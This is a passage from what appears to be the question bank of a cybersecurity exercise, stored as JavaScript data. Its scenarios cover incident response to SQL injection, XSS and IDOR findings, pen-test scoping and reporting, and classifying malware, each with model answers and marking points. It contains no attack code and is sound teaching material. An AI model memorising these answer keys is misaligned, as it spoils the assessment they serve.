      {q:`<p>Name the weakness behind each of the first three findings, and say how serious each is.</p>`,
       model:`<p>(1) <strong>SQL injection</strong>: user input is inserted into an SQL query without parameters. The big reply suggests it worked and the whole table was returned, so it is <strong>critical</strong>: possible breach of customer data. (2) <strong>Cross-site scripting</strong> in the search box (reflected XSS): the log only shows attempts, so severity depends on whether the output is escaped; if so, it is <strong>high</strong>, since scripts could steal sessions or inject content. (3) <strong>Insecure direct object reference / missing access control</strong>: invoices are served by number without checking ownership, <strong>high</strong> because it exposes other customers' personal data.</p>`,
       points:[`SQL injection and why the big 200 reply matters`,`Reflected XSS and that logs show attempts, not success`,`IDOR / missing access control`,`Ranks severity with a reason (data exposure, account takeover)`]},
      {q:`<p>What do you do in the next hour? Put the actions in order.</p>`,
       model:`<p>1) <strong>Preserve evidence</strong>: copy the logs and the changed file before touching them. 2) <strong>Contain</strong>: block the attacking IPs (knowing that this is only a stopgap), and take the vulnerable pages offline or behind a WAF rule. 3) <strong>Assess impact</strong>: which tables the injection could read, and which invoices the third IP saw. 4) <strong>Eradicate</strong>: restore the changed file from a clean baseline and find how it was modified. 5) <strong>Notify</strong> the responsible people, and, where personal data is involved, the legal/data-protection process. 6) Then fix the root causes and monitor.</p>`,
       points:[`Preserve evidence first`,`Contain (block, take pages offline)`,`Assess which data was exposed`,`Restore from a known-good copy and find the cause`,`Notify the right people / data-protection duty`]},
      {q:`<p>Give one concrete fix for each root cause. Why is "block the IP address" not enough?</p>`,
       model:`<p><strong>SQL injection:</strong> parameterised queries (or stored procedures), plus a least-privilege database account. <strong>XSS:</strong> output encoding for the right context, input validation, and a Content-Security-Policy. <strong>IDOR:</strong> a server-side authorisation check that the logged-in user owns the invoice, on every request. <strong>Modified file:</strong> restrict write access, monitor integrity, deploy from version control. Blocking an IP is not enough because attackers change address easily (proxies, botnets), and the <em>vulnerability</em> would still be there for the next person.</p>`,
       points:[`Parameterised queries for SQL injection`,`Output encoding / CSP for XSS`,`Server-side ownership check for IDOR`,`IP blocking is temporary; the vulnerability remains`]}
     ]},
    {id:'pentest',title:'The pen-test request',
     setup:`<p>The shop's owner decides to hire you to run a penetration test of the web application before the sales season. They ask: "Can you start tomorrow? Just try to get in."</p>`,
     tasks:[
      {q:`<p>What must be agreed in writing before any testing starts, and why?</p>`,
       model:`<p>A signed <strong>authorisation</strong> and <strong>scope</strong> (rules of engagement): exactly which systems, URLs and IP ranges may be tested and which are off-limits (for example shared hosting or third-party payment systems you do not own); permitted techniques (and whether denial-of-service or social engineering is excluded); test <strong>windows</strong>; a contact for emergencies; how any discovered sensitive data is handled and destroyed; and how findings are reported. Without written permission, testing is illegal (unauthorised access), and an out-of-scope system could belong to someone else.</p>`,
       points:[`Written authorisation from someone entitled to give it`,`Defined scope: what is in and out`,`Permitted techniques and time windows`,`Handling of discovered data and an emergency contact`]},
      {q:`<p>List the phases of the test in order and say what happens in each.</p>`,
       model:`<p><strong>Planning/reconnaissance:</strong> gather information on the target (domains, technologies). <strong>Scanning/enumeration:</strong> find hosts, open ports, services and versions. <strong>Vulnerability analysis/gaining access:</strong> identify weaknesses and attempt to exploit them within the agreed rules (SQL injection, XSS, broken access control). <strong>Maintaining access / post-exploitation:</strong> show what an attacker could reach from there, without causing harm. <strong>Analysis and reporting:</strong> document everything, remove any test artefacts and give remediation advice.</p>`,
       points:[`Reconnaissance`,`Scanning and enumeration`,`Exploiting vulnerabilities within scope`,`Showing the impact`,`Reporting and cleaning up`]},
      {q:`<p>What should the report contain so that the owner can act on it?</p>`,
       model:`<p>An <strong>executive summary</strong> in plain language; the scope and method; each finding with a <strong>severity rating</strong>, a description, evidence (such as the request and response), the business impact and a <strong>specific recommendation to fix it</strong>; the findings ordered by priority; and what was not tested. A good report helps a developer fix the problem, and a manager decide what to fund first.</p>`,
       points:[`Executive summary for non-technical readers`,`Findings with severity and evidence`,`Impact and a clear fix for each`,`Prioritised list and any limits of the test`]}
     ]},
    {id:'classify',title:'Classify these three',
     setup:`<p>Three incidents are reported: <strong>(A)</strong> a PowerPoint file e-mailed around the department that, when opened and run, copies itself into other documents on the user's PC; <strong>(B)</strong> a free "PDF converter" that works as advertised but also quietly records keystrokes and sends them to a remote server; <strong>(C)</strong> a program that scans the network for a flaw in a file-sharing service and installs itself on every vulnerable machine it finds, without any user action.</p>`,
     tasks:[
      {q:`<p>Classify A, B and C as virus, worm or trojan, with one reason each.</p>`,
       model:`<p><strong>A is a virus</strong>: it attaches itself to host files (documents) and needs a user to open or run them to spread. <strong>B is a trojan</strong>: it pretends to be useful software while hiding a malicious function (here a key logger); it does not replicate by itself. <strong>C is a worm</strong>: it is self-replicating and spreads over the network on its own, exploiting a vulnerability, with no user action and no host file.</p>`,
       points:[`A: virus, needs a host file and a user action`,`B: trojan, disguised, hidden malicious function (key logger)`,`C: worm, self-spreading over the network without a user`]},
      {q:`<p>Which of the three can spread fastest across a company, and which is hardest for an antivirus built on a dictionary of known signatures to catch? Explain.</p>`,
       model:`<p>The <strong>worm (C)</strong> usually spreads fastest, because it needs no human action and uses the network, so it can reach every vulnerable machine in minutes. A signature-based dictionary approach is weakest against anything <strong>new or altered</strong>: a new trojan or a modified (polymorphic) virus has no known signature yet, so the scanner needs the other approaches (integrity checking, behaviour/activity monitoring, sandboxes). The key logger in B would be spotted by watching for behaviour such as hooking the keyboard and sending data out.</p>`,
       points:[`Worm spreads fastest: no user action, uses the network`,`Dictionary approach misses new or altered malware`,`Alternative detection: integrity checking, behaviour monitoring, sandbox`]},
      {q:`<p>Give three protective measures that would have reduced the damage from all three cases.</p>`,
       model:`<p>Keep systems <strong>patched</strong> (stops the worm's flaw); run up-to-date <strong>antivirus plus behaviour monitoring</strong>; apply <strong>least privilege</strong> so malware runs with few rights; <strong>segment the network</strong> and firewall internal file sharing; keep <strong>backups</strong> that cannot be changed by the infected machine; and <strong>train users</strong> not to run unexpected attachments or install untrusted tools. Add monitoring (IDS/log review) and an incident response plan to limit the impact.</p>`,
       points:[`Patching`,`Antivirus plus monitoring`,`Least privilege or network segmentation`,`Backups`,`User awareness`]}
     ]}
  ]
});
